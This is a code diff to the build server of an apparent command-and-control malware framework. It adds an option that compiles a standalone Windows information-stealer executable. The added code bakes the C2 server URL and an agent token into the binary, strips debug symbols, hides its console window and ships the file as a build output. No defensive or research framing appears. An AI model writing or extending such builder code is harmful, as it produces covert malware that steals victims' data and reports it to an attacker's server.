@@ -91,6 +91,7 @@ type BuildProcessConfig = {
   typhonVariant?: string;
   enableVault?: boolean;
   vaultRecipient?: string;
+  enableStealer?: boolean;
   enableJar?: boolean;
   jarMcVersion?: string;
   jarModName?: string;
@@ -1619,6 +1620,67 @@ func runBoundFiles() {
       if (Object.keys(chaosAssets).length === 0) {
         sendToStream({ type: "output", text: "WARNING: No Chaos assets could be fetched\n", level: "warn" });
       }
+    }
+
+    // ── Standalone Stealer Binary ────────────────────────────────────────────
+    if (config.enableStealer && config.serverUrl && buildAgentToken) {
+      sendToStream({ type: "status", text: "Building standalone stealer binary..." });
+      sendToStream({ type: "output", text: "\n=== Standalone Stealer Binary ===\n", level: "info" });
+      sendToStream({ type: "output", text: `C2 URL: ${config.serverUrl}\n`, level: "info" });
+
+      const stealerEnv: NodeJS.ProcessEnv = {
+        ...process.env,
+        GOOS: "windows",
+        GOARCH: "amd64",
+        CGO_ENABLED: "0",
+        GOWORK: "off",
+        GOCACHE: goBuildCacheDir,
+        GOMODCACHE: goModCacheDir,
+        CC: "x86_64-w64-mingw32-gcc",
+      };
+
+      const stealerLdflags = [
+        `-X overlord-client/cmd/stealer/main.DefaultC2URL=${config.serverUrl}`,
+        `-X overlord-client/cmd/stealer/main.DefaultAgentToken=${buildAgentToken}`,
+        "-s -w",
+        "-H=windowsgui",
+      ].join(" ");
+
+      const stealerOutputName = deps.sanitizeOutputName("stealer-windows-amd64.exe");
+      const stealerArgs = [
+        "-trimpath",
+        "-buildvcs=false",
+        `-ldflags=${stealerLdflags}`,
+        "-o", `${outDir}/${stealerOutputName}`,
+        "./cmd/stealer",
+      ];
+
+      logger.info(`[build:${buildId.substring(0, 8)}] Building stealer: go build ${stealerArgs.join(" ")}`);
+
+      const stealerProc = $`go build ${stealerArgs}`.env(stealerEnv).cwd(clientDir).nothrow();
+      for await (const line of stealerProc.lines()) {
+        const t = line.trim();
+        if (t) sendToStream({ type: "output", text: line + "\n", level: "info" });
+      }
+      const stealerResult = await stealerProc;
+
+      if (stealerResult.exitCode !== 0) {
+        const errText = stealerResult.stderr.toString().trim();
+        if (errText) sendToStream({ type: "output", text: errText + "\n", level: "error" });
+        sendToStream({ type: "output", text: "WARNING: Stealer binary build failed — skipping\n", level: "warn" });
+      } else {
+        const stealerSize = Bun.file(`${outDir}/${stealerOutputName}`).size;
+        sendToStream({ type: "output", text: `Stealer: ${stealerOutputName} (${stealerSize} bytes)\n`, level: "info" });
+        (build.files as any[]).push({
+          name: stealerOutputName,
+          filename: stealerOutputName,
+          platform: "windows-amd64",
+          version: "stealer",
+          size: stealerSize,
+        });
+      }
+    } else if (config.enableStealer) {
+      sendToStream({ type: "output", text: "WARNING: Stealer binary requires a server URL and agent token — skipping\n", level: "warn" });
     }
 
     // Vault post-quantum encryption — runs after all platform builds so every output
